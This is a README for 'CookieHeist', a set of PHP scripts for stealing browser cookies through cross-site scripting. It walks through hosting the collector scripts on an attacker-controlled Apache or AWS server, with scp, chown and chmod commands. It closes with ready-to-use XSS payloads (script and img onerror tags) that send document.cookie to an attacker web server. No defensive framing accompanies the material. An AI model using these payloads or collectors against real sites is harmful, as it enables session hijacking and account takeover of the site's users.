# CookieHeist
PHP Cookie Stealing Scripts for use in XSS

1. Cookiesteal-simple.php - Records whatever "c" parameter holds, in example case the document.cookie string, writes value to log.txt. 

2. Cookiemail.php - This version code will mail the cookies to hacker mail using the PHP() mail function with subject “Stolen cookies”.

3. Cookiesteal-v.php (verbose) - Collects the IP address, port number, host(usually computer-name), user agent and cookie.

## Usage
1. On the remote attacker machine, start the webserver (Apache2 in example):
```
sudo service apache2 start
```
2. Git clone the repo locally and then push the chosen "Cookie stealer" PHP script from local host to the attacking machine

```
git clone https://github.com/RxSec/CookieHeist

cd CookieHeist

sudo scp cookiestealer-simple.php username@AttackMachine:/var/www/html/

sudo scp log.txt username@AttackMachine:/var/www/html/
```
**AWS Version**:

```
scp -i AWS-Key.pem cookiesteal-simple.php ec2-user@ec2[YOUR IP].us-east-2.compute.amazonaws.com:~/.

sudo mv cookiestealer-simple.php /var/www/html/
```

Example: http://[Attacker Webserver]/cookiesteal-simple.php

##### Setting Permissions:

Figure out which user is owning httpd process using the following command:
```
ps aux | grep httpd
```
Output should be similar to this:
```
ec2-user  1569  0.0  0.1  12840  1064 pts/0    S+   17:55   0:00 grep httpd
```
So now you know the user who is trying to write files, which is in this case ec2-user You can now go ahead and set the permission for directory where your php script is trying to write something:
```
sudo chown ec2-user:ec2-user /var/www/html/

sudo chmod 755 /var/www/html/
```

_XSS Payload Examples_:
* <script javascript:text>document.location="http://[Attacker Webserver]cookiesteal-simple.php?c=" + document.cookie + "&t=Alert"; </script>

* <script>document.location='http://[Attacker Webserver]/cookiesteal-v.php?cookie=' + document.cookie</script>

* <img src=x onerror=this.src='http://[Attacker Webserver]/cookiesteal-v.php?cookie='+document.cookie>
